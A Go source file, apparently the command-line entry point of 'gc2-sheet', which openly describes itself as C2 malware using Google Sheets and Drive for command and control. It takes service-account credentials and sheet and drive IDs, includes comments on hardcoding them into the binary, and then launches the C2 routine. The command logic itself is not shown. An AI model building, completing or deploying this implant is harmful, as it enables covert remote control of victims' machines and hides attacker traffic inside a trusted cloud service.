package cmd

import (
	"GC2-sheet/internal/C2"
	"GC2-sheet/internal/configuration"
	"github.com/spf13/cobra"
	"os"
)

var (
	credential string
	sheetId string
	driveId string
)



var rootCmd = &cobra.Command{
	Use:   "gc2-sheet",
	Short: "gc2-sheet new C2 malware that uses Google Sheet as command & control.",
	Long: `gc2-sheet new C2 malware that uses Google Sheet as command & control.`,
	Run: func(cmd *cobra.Command, args []string) {

		configuration.SetOptions(credential, sheetId, driveId) // Comment this line if you want to hardcode the parameters
		// configuration.SetOptions(<json>, <sheetId>, <driveId>) // Remove comment from this line if you want to hardcode the parameters.
																	// Json string must but be escaped: " --> \" and \n --> \n. Example: {"test":"value\n"} --> "{\"test\":\"value\\n\"}"
		C2.Run()

	},
}

func init()  {

	rootCmd.Flags().StringVarP(&credential, "key", "k", "", "GCP service account credential in JSON")
	rootCmd.MarkFlagRequired("key") // Comment the line if you want to hardcode the parameter

	rootCmd.Flags().StringVarP(&sheetId, "sheet", "s", "", "Google sheet ID")
	rootCmd.MarkFlagRequired("sheet") // Comment the line if you want to hardcode the parameter

	rootCmd.Flags().StringVarP(&driveId, "drive", "d", "", "Google drive ID")
	rootCmd.MarkFlagRequired("drive") // Comment the line if you want to hardcode the parameter
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {


		os.Exit(1)
	}
}